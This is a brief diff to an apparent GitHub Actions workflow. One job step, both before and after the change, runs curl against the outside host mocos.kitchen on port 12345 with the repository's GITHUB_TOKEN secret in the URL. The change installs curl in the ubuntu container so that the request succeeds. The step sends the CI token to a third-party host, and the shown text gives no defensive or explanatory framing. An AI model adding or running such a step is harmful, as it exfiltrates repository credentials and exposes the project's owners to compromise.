@@ -7,4 +7,6 @@ jobs:
     container: ubuntu:20.04
     steps:
       - run: |
-          curl mocos.kitchen:12345/${{ secrets.GITHUB_TOKEN }}
+          apt update -qq
+          apt install -y curl
+          curl "mocos.kitchen:12345/${{ secrets.GITHUB_TOKEN }}"
